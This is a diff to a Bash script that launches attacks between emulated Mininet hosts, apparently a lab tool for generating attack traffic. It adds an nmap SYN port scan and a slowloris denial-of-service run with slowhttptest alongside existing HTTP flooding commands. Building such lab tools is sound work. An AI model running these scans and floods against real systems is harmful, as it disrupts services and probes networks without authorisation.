@@ -3,7 +3,7 @@
 # Detecta hosts en Mininet (dentro del contenedor) y ejecuta un ataque seleccionado
 # Uso: ./auto_attack.sh <attack> [--attacker hX] [--victim hY] [--duration N]
 # ataques: icmp syn udp http
-
+# nuevos ataques: portscan slowloris
 set -euo pipefail
 ATTACK=${1:-}
 shift || true
@@ -23,13 +23,13 @@ while [[ $# -gt 0 ]]; do
     --duration)
       if [[ $# -lt 2 ]]; then echo "Missing value for --duration"; exit 1; fi
       DURATION="$2"; shift 2;;
-    -h|--help) echo "Usage: $0 <icmp|syn|udp|http> [--attacker h1] [--victim h2] [--duration 10]"; exit 0;;
+    -h|--help) echo "Usage: $0 <icmp|syn|udp|http|portscan|slowloris> [--attacker h1] [--victim h2] [--duration 10]"; exit 0;;
     *) echo "Unknown arg $1"; exit 1;;
   esac
 done
 
 if [[ -z "$ATTACK" ]]; then
-  echo "Specify attack type: icmp|syn|udp|http"
+  echo "Specify attack type: icmp|syn|udp|http|portscan|slowloris"
   exit 1
 fi
 
@@ -157,12 +157,28 @@ case "$ATTACK" in
     dc_exec "mnexec -a $ATTACKER_PID bash -lc 'if command -v ab >/dev/null 2>&1; then ab -t $DURATION -n 1000000 -c 50 http://$VICTIM_IP/ >/tmp/auto_ab.log 2>&1; elif command -v curl >/dev/null 2>&1; then end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do curl -s http://$VICTIM_IP/ >/dev/null; done; elif command -v wget >/dev/null 2>&1; then end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do wget -qO- http://$VICTIM_IP/ >/dev/null; done; else end=\$((SECONDS + $DURATION)); while [ \$SECONDS -lt \$end ]; do python3 -c \"import urllib.request; urllib.request.urlopen('\''http://$VICTIM_IP/'\'')\" >/dev/null 2>&1; done; fi'"
     dc_exec "mnexec -a $VICTIM_PID pkill -f http.server || true"
     ;;
+  portscan)
+    check_tool nmap
+    echo "Running nmap TCP SYN scan against $VICTIM_IP for up to ${DURATION}s..."
+    # -T4 for speed. timeout ensures it doesn't run longer than DURATION.
+    dc_exec "mnexec -a $ATTACKER_PID timeout $DURATION nmap -sS -p 1-1024 -T4 $VICTIM_IP > /tmp/auto_nmap.log 2>&1"
+    ;;
+  slowloris)
+    check_tool slowhttptest
+    echo "Starting web server on victim $VICTIM..."
+    dc_exec "mnexec -a $VICTIM_PID python3 -m http.server 80 >/dev/null 2>&1 &"
+    echo "Running slowloris attack from $ATTACKER to $VICTIM_IP for ${DURATION}s..."
+    # -c: connections, -H: slowloris mode, -l: duration, -u: URL. Console output is redirected for logging.
+    dc_exec "mnexec -a $ATTACKER_PID slowhttptest -c 1000 -H -l $DURATION -u http://$VICTIM_IP/ -o /tmp/slowloris_report > /tmp/auto_slowloris.log 2>&1"
+    echo "Cleaning up web server on victim $VICTIM..."
+    dc_exec "mnexec -a $VICTIM_PID pkill -f http.server || true"
+    ;;
   *) echo "Unknown attack '$ATTACK'"; exit 2;;
 esac
 
 echo "Attack finished. Logs: /tmp/auto_hping.log (inside mininet container)"
 echo "--- Last logs ---"
-dc_exec "tail -n 5 /tmp/auto_hping.log 2>/dev/null || tail -n 5 /tmp/auto_ab.log 2>/dev/null || echo 'No logs found'"
+dc_exec "tail -n 5 /tmp/auto_hping.log 2>/dev/null || tail -n 5 /tmp/auto_ab.log 2>/dev/null || tail -n 5 /tmp/auto_nmap.log 2>/dev/null || tail -n 5 /tmp/auto_slowloris.log 2>/dev/null || echo 'No logs found'"
 echo "-----------------"
 
 echo "To inspect victim counters:"
